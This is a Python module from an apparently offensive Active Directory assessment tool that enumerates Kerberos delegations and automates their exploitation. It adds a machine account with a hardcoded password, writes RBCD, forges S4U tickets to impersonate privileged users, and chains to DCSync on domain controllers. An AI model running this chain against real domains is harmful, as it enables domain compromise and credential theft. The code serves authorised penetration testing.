"""CLI orchestration for Kerberos delegation enumeration and exploitation.

This module keeps delegation *UI + reporting* logic out of the monolith.
The service layer performs the tool execution and basic parsing; this module:
- resolves workspace paths
- prints operation headers
- updates reports + telemetry
- renders Rich tables
- handles user prompts for enumeration and exploitation
"""

from __future__ import annotations

import os
import re
import subprocess
from typing import Protocol

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.rich_output import (
    print_exception,
)
from rich.prompt import Confirm


class DelegationShell(Protocol):
    """Minimal shell surface used by the delegation controller."""

    console: object
    domains: list[str]
    domains_dir: str
    domain: str | None
    type: str | None
    auto: bool
    scan_mode: str | None
    current_workspace_dir: str | None
    domains_data: dict
    impacket_scripts_dir: str | None
    command_runner: object
    license_mode: object

    def _get_workspace_cwd(self) -> str: ...

    def _get_lab_slug(self) -> str | None: ...

    def build_auth_impacket_no_host(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def check_maq(self, domain: str, username: str, password: str) -> int: ...

    def get_delegatable_privileged_user(self, domain: str) -> str | None: ...

    def is_computer_dc(self, domain: str, hostname: str) -> bool: ...

    def return_credentials(self, domain: str) -> tuple[str | None, str | None]: ...

    def update_report_field(self, domain: str, field: str, value: object) -> None: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dcsync(self, domain: str, username: str, ticket: str) -> None: ...

    def dcsync(self, domain: str, username: str, ticket: str) -> None: ...


def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
    """
    Enumerates Kerberos delegations in the specified domain.

    Usage: enum_delegations <domain>

    Performs the enumeration of Kerberos delegations in the domain

    """
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Build the base command
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        find_delegation_path = os.path.join(
            shell.impacket_scripts_dir, "findDelegation.py"
        )
        if not os.path.isfile(find_delegation_path) or not os.access(
            find_delegation_path, os.X_OK
        ):
            print_error(
                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        auth = shell.build_auth_impacket_no_host(
            shell.domains_data[shell.domain]["username"],
            shell.domains_data[shell.domain]["password"],
            shell.domain,
        )
        marked_domain = mark_sensitive(domain, "domain")
        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
        marked_domain = mark_sensitive(domain, "domain")
        print_info(f"Enumerating Kerberos delegations in domain {marked_domain}")
        print_info_debug(f"Command: {command}")

        # First execution without -k
        completed_process = shell.run_command(command, timeout=300)

        output = completed_process.stdout
        # stderr is available in completed_process.stderr if needed

        # If there is a credential error, try with -k
        if (
            "invalidCredentials" in output or "AcceptSecurityContext error" in output
        ):  # Check against 'output' from the first run
            command += " -k"
            print_info("Retrying with -k")
            # Overwrite completed_process with the result of the retry
            completed_process = shell.run_command(command, timeout=300)
            output = completed_process.stdout
        if completed_process.returncode == 0:
            # Initialize the domain dictionary if it does not exist
            if domain not in shell.domains_data:
                shell.domains_data[domain] = {}

            # Initialize delegations as an empty list
            shell.domains_data[domain]["delegations"] = []

            # Check if there are no entries
            if "No entries found!" in output:
                print_error("No delegations found in domain.")
                shell.update_report_field(domain, "unconstrained_delegation", None)
                shell.update_report_field(domain, "constrained_delegation", None)

                # Telemetry: track when no delegations found
                try:
                    properties = {
                        "total_delegations": 0,
                        "unconstrained_count": 0,
                        "constrained_count": 0,
                        "constrained_protocol_transition_count": 0,
                        "resource_based_constrained_count": 0,
                        "unknown_count": 0,
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get(
                            "auth", "unknown"
                        ),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as e:
                    telemetry.capture_exception(e)
                return

            # Split the output into lines and process
            lines = output.strip().split("\n")
            # Find the index of the line containing "AccountName"
            try:
                account_name_index = next(
                    i for i, line in enumerate(lines) if "AccountName" in line
                )
                # Delegations begin two lines after "AccountName"
                delegations_start = account_name_index + 2

                # Track delegation types for telemetry (without exfiltrating user info)
                delegation_type_counts = {
                    "unconstrained": 0,
                    "constrained": 0,
                    "constrained_protocol_transition": 0,
                    "resource_based_constrained": 0,
                    "unknown": 0,
                }

                # Store full delegation data for rich display
                delegations_full_data = []

                # Process only the lines after the headers
                for line in lines[delegations_start:]:
                    if not line.strip():
                        continue

                    # Try to parse delegation type using regex (similar to enum_delegations_user)
                    # Pattern matches: AccountName AccountType DelegationType DelegationTo
                    matches = re.findall(
                        r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?(?:Unconstrained|Constrained)(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
                        line,
                        re.IGNORECASE,
                    )

                    if matches:
                        account, account_type, delegation_type, delegation_to = matches[
                            0
                        ]
                        if account:  # If the account is not empty
                            delegation_type_lower = delegation_type.lower()

                            # Skip unconstrained delegations on Domain Controllers (false positives)
                            try:
                                is_unconstrained = (
                                    "unconstrained" in delegation_type_lower
                                    and "resource-based" not in delegation_type_lower
                                )
                                if (
                                    is_unconstrained
                                    and account_type.lower() == "computer"
                                ):
                                    # Convert machine account (e.g., DC$) to hostname for DC detection
                                    host_candidate = account.rstrip("$")
                                    if host_candidate and shell.is_computer_dc(
                                        domain, host_candidate
                                    ):
                                        marked_domain = mark_sensitive(domain, "domain")
                                        marked_account = mark_sensitive(account, "user")
                                        print_info_debug(
                                            "[delegation] Skipping unconstrained "
                                            "delegation for Domain Controller "
                                            f"account {marked_account} in domain "
                                            f"{marked_domain} (considered expected "
                                            "behaviour)."
                                        )
                                        # Do not store or count this delegation
                                        continue
                            except Exception as exc:
                                telemetry.capture_exception(exc)

                            shell.domains_data[domain]["delegations"].append(account)

                            # Store full delegation data
                            delegations_full_data.append(
                                {
                                    "account": account,
                                    "account_type": account_type,
                                    "delegation_type": delegation_type,
                                    "delegation_to": delegation_to,
                                }
                            )

                            # Classify delegation type for telemetry
                            if "unconstrained" in delegation_type_lower:
                                delegation_type_counts["unconstrained"] += 1
                            elif "resource-based" in delegation_type_lower:
                                delegation_type_counts[
                                    "resource_based_constrained"
                                ] += 1
                            elif (
                                "protocol transition" in delegation_type_lower
                                and "w/o" not in delegation_type_lower
                            ):
                                delegation_type_counts[
                                    "constrained_protocol_transition"
                                ] += 1
                            elif "constrained" in delegation_type_lower:
                                delegation_type_counts["constrained"] += 1
                            else:
                                delegation_type_counts["unknown"] += 1
                    else:
                        # Fallback: simple parsing for lines that don't match regex
                        parts = line.split()
                        if parts and len(parts) > 0:
                            account = parts[0].strip()
                            if account:  # If the account is not empty
                                shell.domains_data[domain]["delegations"].append(
                                    account
                                )
                                # Store with unknown type
                                delegations_full_data.append(
                                    {
                                        "account": account,
                                        "account_type": "Unknown",
                                        "delegation_type": "Unknown",
                                        "delegation_to": "N/A",
                                    }
                                )
                                delegation_type_counts["unknown"] += 1

                # Remove duplicates while preserving order
                shell.domains_data[domain]["delegations"] = list(
                    dict.fromkeys(shell.domains_data[domain]["delegations"])
                )

                total_delegations = len(shell.domains_data[domain]["delegations"])

                # Update the technical report cache for delegation-related findings
                if total_delegations == 0:
                    # Explicitly record that no delegations were found
                    shell.update_report_field(domain, "unconstrained_delegation", None)
                    shell.update_report_field(domain, "constrained_delegation", None)
                else:
                    has_unconstrained = delegation_type_counts["unconstrained"] > 0
                    has_constrained = any(
                        delegation_type_counts[key] > 0
                        for key in (
                            "constrained",
                            "constrained_protocol_transition",
                            "resource_based_constrained",
                        )
                    )
                    shell.update_report_field(
                        domain, "unconstrained_delegation", has_unconstrained
                    )
                    shell.update_report_field(
                        domain, "constrained_delegation", has_constrained
                    )

                # Telemetry: track delegation enumeration results
                try:
                    properties = {
                        "total_delegations": total_delegations,
                        "unconstrained_count": delegation_type_counts["unconstrained"],
                        "constrained_count": delegation_type_counts["constrained"],
                        "constrained_protocol_transition_count": delegation_type_counts[
                            "constrained_protocol_transition"
                        ],
                        "resource_based_constrained_count": delegation_type_counts[
                            "resource_based_constrained"
                        ],
                        "unknown_count": delegation_type_counts["unknown"],
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get(
                            "auth", "unknown"
                        ),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as e:
                    telemetry.capture_exception(e)

                # Display delegations with professional formatting
                from adscan_internal.rich_output import print_delegations_summary

                print_delegations_summary(domain, delegations_full_data)
            except StopIteration as e:
                telemetry.capture_exception(e)
                print_error("Expected structure not found in output")

                # If the expected structure is missing, mark delegations as not found
                shell.update_report_field(domain, "unconstrained_delegation", None)
                shell.update_report_field(domain, "constrained_delegation", None)

                # Telemetry: track when no delegations structure found
                try:
                    properties = {
                        "total_delegations": 0,
                        "unconstrained_count": 0,
                        "constrained_count": 0,
                        "constrained_protocol_transition_count": 0,
                        "resource_based_constrained_count": 0,
                        "unknown_count": 0,
                        "error": "structure_not_found",
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get(
                            "auth", "unknown"
                        ),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as exc:
                    telemetry.capture_exception(exc)
        else:
            print_error(
                f"Error enumerating delegations: {completed_process.stderr.strip() if completed_process.stderr else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error enumerating delegations.")
        print_exception(show_locals=False, exception=e)


def enum_delegations_user(
    shell: DelegationShell, domain: str, username: str, password: str
) -> None:
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Build the base command
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        find_delegation_path = os.path.join(
            shell.impacket_scripts_dir, "findDelegation.py"
        )
        if not os.path.isfile(find_delegation_path) or not os.access(
            find_delegation_path, os.X_OK
        ):
            print_error(
                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        marked_domain = mark_sensitive(domain, "domain")
        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
        marked_username = mark_sensitive(username, "user")
        print_info_verbose(f"Enumerating delegation details for user {marked_username}")

        # First execution without -k
        completed_process = shell.run_command(command, timeout=300)
        output = completed_process.stdout
        error = completed_process.stderr
        # If there is a credentials error, try with -k
        if "invalidCredentials" in output or "AcceptSecurityContext error" in output:
            command += " -k"
            print_success("Retrying with -k")
            completed_process = shell.run_command(command, timeout=300)
            output = completed_process.stdout
            error = completed_process.stderr
        if completed_process.returncode == 0:
            # Process the output line by line
            lines = output.strip().split("\n")
            for line in lines:
                if line.startswith("AccountName") or line.startswith("-"):
                    continue

                # Use regular expression to split the line while preserving spaces in delegation types
                matches = re.findall(
                    r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?Constrained(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
                    line,
                )

                if matches:
                    account_name, account_type, delegation_type, delegation_to = (
                        matches[0]
                    )
                    if account_name == username:  # Only process the specific user
                        # Directly proceed to ask for exploitation with the full delegation type
                        shell.ask_for_exploit_delegation(
                            domain,
                            username,
                            password,
                            delegation_type,
                            delegation_to,
                        )
                        break  # Exit after finding the user
        else:
            print_error(f"Error enumerating delegations: {error}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error enumerating user delegations.")
        print_exception(show_locals=False, exception=e)


def ask_for_exploit_delegation(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_type: str,
    delegation_to: str,
) -> None:
    """Prompt user to exploit a delegation."""
    from adscan_internal.rich_output import mark_sensitive

    marked_delegation_to = mark_sensitive(delegation_to, "service")
    marked_username = mark_sensitive(username, "user")
    respuesta = Confirm.ask(
        f"Do you want to exploit the delegation {delegation_type} on {marked_delegation_to} for user {marked_username}?", default=True
    )
    if respuesta:
        if delegation_type.lower() == "constrained":
            exploit_delegation_rbcd(shell, domain, username, password, delegation_to)
        elif delegation_type == "Constrained w/ Protocol Transition":
            exploit_delegation_constrained(
                shell, domain, username, password, delegation_to
            )


def exploit_delegation_constrained(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_to: str,
) -> None:
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Extract the hostname from the SPN (after the forward slash)
        target_host = (
            delegation_to.split("/")[1] if "/" in delegation_to else delegation_to
        )
        target_user = shell.get_delegatable_privileged_user(domain)

        # Build the netexec command
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        get_st_path = os.path.join(shell.impacket_scripts_dir, "getST.py")
        if not os.path.isfile(get_st_path) or not os.access(get_st_path, os.X_OK):
            print_error(
                f"getST.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        marked_delegation_to = mark_sensitive(delegation_to, "service")
        command = f"{get_st_path} -spn '{marked_delegation_to}' -impersonate '{target_user}' {auth}"

        marked_target_host = mark_sensitive(target_host, "hostname")
        print_info(f"Exploiting constrained delegation against {marked_target_host}")

        # Telemetry: track delegation exploitation attempt
        try:
            properties = {
                "delegation_type": "constrained_protocol_transition",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # Execute the command using the existing execute_dump_lsa function
        execute_constrained(shell, command, domain, target_host, target_user)

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error exploiting constrained delegation.")
        print_exception(show_locals=False, exception=e)


def execute_constrained(
    shell: DelegationShell,
    command: str,
    domain: str,
    target_host: str,
    target_user: str,
) -> None:
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.exploitation import ExploitationService

    try:
        service = ExploitationService()
        result = service.delegation.run_s4proxy_command(
            command=command,
            timeout=300,
        )
        output_str = (result.stdout or "") + (result.stderr or "")

        if result.returncode == 0:
            marked_target_host = mark_sensitive(target_host, "hostname")
            print_success(f"Command executed successfully on {marked_target_host}.")

            # Update active attack-graph edge (if this exploitation was launched from an attack path).
            if hasattr(shell, "_update_active_attack_graph_step_status"):
                try:
                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                        domain=domain,
                        status="success",
                        notes={
                            "target_host": target_host,
                            "impersonated": target_user,
                        },
                    )
                except Exception as exc:
                    telemetry.capture_exception(exc)

            # Extract the .ccache file path from the output
            match = re.search(r"Saving ticket in ([^\s]+)", output_str)
            if match:
                ccache_file = match.group(1)
                print_warning(f".ccache file found: {ccache_file}")
            else:
                print_error("Could not extract the .ccache file from the output.")
                ccache_file = None

            # Telemetry: track successful delegation exploitation
            try:
                properties = {
                    "delegation_type": "constrained_protocol_transition",
                    "ticket_obtained": ccache_file is not None,
                    "target_is_dc": shell.is_computer_dc(domain, target_host),
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(build_lab_event_fields(shell=shell, include_slug=True))
                telemetry.capture("delegation_exploitation_success", properties)
            except Exception as e:
                telemetry.capture_exception(e)

            # Check if the host is a Domain Controller.
            # Returns True if identified as DC.
            if shell.is_computer_dc(domain, target_host):
                marked_target_host = mark_sensitive(target_host, "hostname")
                print_warning(
                    f"{marked_target_host} identified as Domain Controller. Proceeding with DCSync."
                )
                if ccache_file:
                    # Call dcsync passing the .ccache file path instead of the password
                    shell.dcsync(domain, target_user, ccache_file)
            else:
                marked_target_host = mark_sensitive(target_host, "hostname")
                print_warning(
                    f"{marked_target_host} is not identified as a Domain Controller. DCSync will not be invoked."
                )
        else:
            if hasattr(shell, "_update_active_attack_graph_step_status"):
                try:
                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                        domain=domain,
                        status="failed",
                        notes={
                            "target_host": target_host,
                            "impersonated": target_user,
                        },
                    )
                except Exception as exc:
                    telemetry.capture_exception(exc)

            # Telemetry: track failed delegation exploitation
            try:
                properties = {
                    "delegation_type": "constrained_protocol_transition",
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(build_lab_event_fields(shell=shell, include_slug=True))
                telemetry.capture("delegation_exploitation_failed", properties)
            except Exception as e:
                telemetry.capture_exception(e)

            error_msg = (
                (result.stderr or "").strip()
                if result.stderr
                else (result.stdout or "").strip()
            )
            marked_target_host = mark_sensitive(target_host, "hostname")
            print_error(
                f"Error executing command on {marked_target_host}: {error_msg if error_msg else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        marked_target_host = mark_sensitive(target_host, "hostname")
        print_error(f"Exception in execute_constrained for {marked_target_host}.")
        print_exception(show_locals=False, exception=e)


def exploit_delegation_rbcd(
    shell: DelegationShell, domain: str, username: str, password: str, target: str
) -> None:
    """Coordinates the exploitation of constrained delegation."""
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Telemetry: track delegation exploitation attempt
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # First, check MAQ
        maq = shell.check_maq(domain, username, password)
        success = False

        if maq > 0:
            # If MAQ allows creating computers, continue with the original flow
            computer_name = "rbcd_computer$"
            computer_pass = "Password12321"

            marked_username = mark_sensitive(username, "user")
            print_success(
                f"Starting constrained delegation exploitation for {marked_username}"
            )

            # Step 1: Create new computer
            if shell.add_computer_to_domain(
                domain, computer_name, computer_pass, username, password
            ):
                # Step 2: Configure RBCD
                if shell.set_rbcd_delegation(
                    domain, computer_name, target, computer_pass, username, password
                ):
                    # Step 3: Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, computer_name, username, computer_pass
                    ):
                        # Step 4: Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        else:
            # If MAQ does not allow creating computers, use an existing one
            print_warning("MachineAccountQuota is 0, new computers cannot be created")
            print_info("Select an existing user to configure RBCD")

            selected_user, selected_cred = shell.return_credentials(domain)
            if selected_user and selected_cred:
                # Configure RBCD with the selected user
                if shell.set_rbcd_delegation(
                    domain, selected_user, target, selected_cred, username, password
                ):
                    # Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, selected_user, username, selected_cred
                    ):
                        # Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        # Telemetry: track exploitation result
        try:
            if success:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "used_new_computer": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_success", properties)
            else:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "maq_available": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e:
            telemetry.capture_exception(e)

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during constrained delegation exploitation.")
        print_exception(show_locals=False, exception=e)

        # Telemetry: track exception during exploitation
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "error": True,
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e2:
            telemetry.capture_exception(e2)


def add_computer_to_domain(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Adds a new computer to the domain."""
    try:
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        command = f"addcomputer.py -computer-name '{computer_name}$' -computer-pass '{computer_pass}' "
        command += f"-dc-host {shell.domains_data[domain]['pdc']} "
        command += f"{auth}"

        print_success("Adding computer to the domain")
        proc = shell.run_command(command, timeout=300)

        if proc.returncode == 0:
            print_success(f"Computer {computer_name}$ added successfully")
            return True
        print_error(f"Error adding computer: {proc.stderr}")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error adding computer.")
        print_exception(show_locals=False, exception=e)
        return False


def set_rbcd_delegation(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    target: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Configures RBCD for the created computer."""
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.exploitation import ExploitationService

    try:
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        rbcd_path = os.path.join(shell.impacket_scripts_dir, "rbcd.py")
        if not os.path.isfile(rbcd_path) or not os.access(rbcd_path, os.X_OK):
            print_error(
                f"rbcd.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        marked_username = mark_sensitive(username, "user")
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        command = f"{rbcd_path} -delegate-from '{computer_name}' -delegate-to '{marked_username}' "
        command += f"-dc-ip {shell.domains_data[domain]['pdc']} -action 'write' "
        command += f"{auth} -use-ldaps"

        print_success("Configuring RBCD")
        service = ExploitationService()
        success = service.delegation.run_rbcd_command(
            command=command,
            timeout=300,
        )

        if success:
            print_success("RBCD configured successfully")
            return True

        print_error("Error configuring RBCD. Check logs for details.")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error configuring RBCD.")
        print_exception(show_locals=False, exception=e)
        return False


def create_forwardable_ticket(
    shell: DelegationShell,
    domain: str,
    s4u_account: str,
    username: str,
    s4u_password: str,
) -> bool:
    """Create a forwardable ticket using S4U via KerberosTicketService."""
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.kerberos_ticket_service import (
        KerberosTicketService,
    )

    try:
        # Get a privileged user that can be delegated
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            print_error("No privileged user found that can be delegated")
            return False

        # Normalize S4U account (drop trailing $ for computer accounts)
        if isinstance(s4u_account, str) and s4u_account.endswith("$"):
            s4u_account = s4u_account.rstrip("$")

        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return False

        service = KerberosTicketService()
        result = service.create_forwardable_ticket(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            domain=domain,
            pdc_hostname=shell.domains_data[domain]["pdc_hostname"],
            pdc_ip=shell.domains_data[domain]["pdc"],
            target_user=target_user,
            s4u_account=s4u_account,
            s4u_password=s4u_password,
        )

        if result.success:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Forwardable ticket created successfully for domain {marked_domain}"
            )
            return True

        print_error(
            "Error creating forwardable ticket. Check logs for detailed information."
        )
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error creating forwardable ticket.")
        print_exception(show_locals=False, exception=e)
        return False


def launch_s4proxy(
    shell: DelegationShell, domain: str, target: str, username: str, password: str
) -> bool:
    """Launches the S4Proxy attack with the forwardable ticket."""
    from adscan_internal.services.exploitation import ExploitationService

    try:
        # Get a privileged user that can be delegated
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            print_error("No privileged user found that can be delegated")
            return False

        auth = shell.build_auth_impacket_no_host(username, password, domain)
        # Remove trailing $ if present
        if username.endswith("$"):
            username = username.rstrip("$")
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return False
        get_st_path = os.path.join(shell.impacket_scripts_dir, "getST.py")
        if not os.path.isfile(get_st_path) or not os.access(get_st_path, os.X_OK):
            print_error(
                f"getST.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return False
        command = f"{get_st_path} -impersonate '{target_user}' -spn '{target}' "
        command += f"-additional-ticket '{target_user}@browser_{shell.domains_data[domain]['pdc_hostname']}.{domain}@{domain.upper()}.ccache' "
        command += f"-dc-ip {shell.domains_data[domain]['pdc']} "
        command += f"{auth}"

        print_success("Launching S4Proxy")
        service = ExploitationService()
        result = service.delegation.run_s4proxy_command(
            command=command,
            timeout=300,
        )

        if result.returncode == 0:
            # Dynamically extract the .ccache file name from stdout
            match = re.search(r"Saving ticket in (\S+)", result.stdout or "")
            ticket = match.group(1) if match else None

            print_success("S4Proxy executed successfully")
            if ticket:
                shell.ask_for_dcsync(domain, target_user, ticket)
            else:
                print_warning(
                    "S4Proxy completed but could not parse ticket path from output."
                )
            return True

        print_error(f"Error executing S4Proxy: {result.stderr}")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing S4Proxy.")
        print_exception(show_locals=False, exception=e)
        return False
